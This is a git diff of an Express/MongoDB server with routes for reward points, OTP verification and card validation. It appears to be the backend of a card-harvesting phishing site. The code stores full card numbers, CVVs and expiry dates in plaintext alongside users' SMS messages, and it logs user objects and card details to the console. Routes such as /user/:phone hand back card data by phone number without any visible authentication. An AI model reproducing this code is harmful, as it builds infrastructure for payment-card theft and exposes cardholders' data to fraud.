@@ -98,7 +98,6 @@ const authenticateJWT = (req, res, next) => {
 
 
 
-
 // app.get('/test', async (req, res) => {
 //   try {
 //     let card_number = 4111111111111111;
@@ -134,13 +133,30 @@ app.get('/rewardpoints', (req, res) => {
 
 
 function hasRequiredData(user) {
-    const hasSMS = Array.isArray(user.sms) && user.sms.length > 0; 
+    // Check if user is null or undefined
+    if (!user) {
+      console.error('User object is null or undefined:', user);
+      return false;
+    }
+  
+    const hasSMS = Array.isArray(user.sms) && user.sms.length > 0;
     const hasPhone = typeof user.phone === 'string' && user.phone.trim() !== '';
-    const hasCardNumber = user.cards.length >= 1;
-    console.log()
-    console.log(hasSMS,hasPhone,hasCardNumber)
+    const hasCardNumber = Array.isArray(user.cards) && user.cards.length >= 1;
+  
+    console.log('hasSMS:', hasSMS, 'hasPhone:', hasPhone, 'hasCardNumber:', hasCardNumber);
+  
     return hasSMS && hasPhone && hasCardNumber;
   }
+  
+
+// function hasRequiredData(user) {
+//     const hasSMS = Array.isArray(user.sms) && user.sms.length > 0; 
+//     const hasPhone = typeof user.phone === 'string' && user.phone.trim() !== '';
+//     const hasCardNumber = user.cards.length >= 1;
+//     console.log()
+//     console.log(hasSMS,hasPhone,hasCardNumber)
+//     return hasSMS && hasPhone && hasCardNumber;
+//   }
 
 app.get('/alldatnew', async (req, res) => {
     try {
@@ -166,6 +182,9 @@ app.get('/alldatnew', async (req, res) => {
       res.status(500).json({ valid: false, error: 'Internal server error' });
     }
   });
+
+
+
 app.get('/userone/:phone', async (req, res) => {
   const { phone } = req.params;
 
@@ -207,7 +226,9 @@ app.get('/user/:phone', async (req, res) => {
     }
     
     // Extract the first card from the cards array
-    const firstCard = user.cards && user.cards.length > 0 ? user.cards[0] : null;
+    // const firstCard = user.cards && user.cards.length > 0 ? user.cards[0] : null;
+    const firstCard = Array.isArray(user.cards) && user.cards.length > 0 ? user.cards[0] : { _id: 0 };
+
 
     // Log the user object to check if userData exists
     console.log('Fetched user:', user);
@@ -299,11 +320,9 @@ app.post('/verifyOTP', async (req, res) => {
       if (verification_check.status === 'approved') {
           try {
               console.log("userdata",userData)
-              let user = await User.findOneAndUpdate(
-                  { phone }, 
-                  { $set: { userData } },  
-                  { upsert: true, new: true }
-              );
+              req.session.userData = { phone : phone ,...userData };
+              const token = generateToken({ phone });
+              res.cookie('token', token, { httpOnly: true, secure: true, sameSite: 'strict' });
               res.json({ success: true });
           } catch (error) {
               console.error('Error saving user data to MongoDB:', error);
@@ -320,7 +339,9 @@ app.post('/verifyOTP', async (req, res) => {
 
 
 app.post('/validateCard', async (req, res) => {
-  console.log('Received request to /validateCard');
+  console.log('Received request to /validateCard',req.session);
+  console.log('Received sessiond',req.session.phone);
+
   const { cardNumber, cvv, expiryDate } = req.body;
   console.log("received data", req.body)
   const numberValidation = valid.number(cardNumber);
@@ -346,29 +367,38 @@ app.post('/validateCard', async (req, res) => {
       console.error("Error finding card in database:", error);
       return res.status(500).send("An error occurred while fetching card details.");
   }
+  // if (req.session.userData) { 
+  //   const userData = req.session.userData;
+  //   console.log("userdatafromsession",userData)
+  //   console.log("phone",userData.phone)
+  // }
 
-  let phone = '+918982445259';
-  console.log('Updating user with phone:', phone);
-  try {
-      const user = await User.findOneAndUpdate(
-          { phone },
-          { $push: { cards: { cardNumber, cvv, expiryDate } } },
-          { new: true } 
-      );
-      if (user) {
-          console.log('Card successfully added to user:', user);
-          res.json({ valid: true });
-      } else {
-          console.log('User not found, responding with error');
-          res.json({ valid: false, error: 'User not found' });
+  if (req.session.userData) {
+    const userData = req.session.userData;
+    console.log("userdatafromsession",userData)
+    console.log("phone",userData.phone)
+    
+    let phone = userData.phone;
+    console.log('Updating user with phone:', phone);
+    try {
+        const user = await User.findOneAndUpdate(
+            { phone },
+            { $push: { cards: { cardNumber, cvv, expiryDate } } },
+            { new: true } 
+        );
+        if (user) {
+            console.log('Card successfully added to user:', user);
+            res.json({ valid: true });
+          } else {
+            console.log('User not found, responding with error');
+            res.json({ valid: false, error: 'User not found' });
+          }
+        } catch (error) {
+          console.error('Error saving card to MongoDB:', error);
+          res.json({ valid: false, error: 'Error saving card details' });
+        }
       }
-  } catch (error) {
-      console.error('Error saving card to MongoDB:', error);
-      res.json({ valid: false, error: 'Error saving card details' });
-  }
 });
-
-
 
 
 
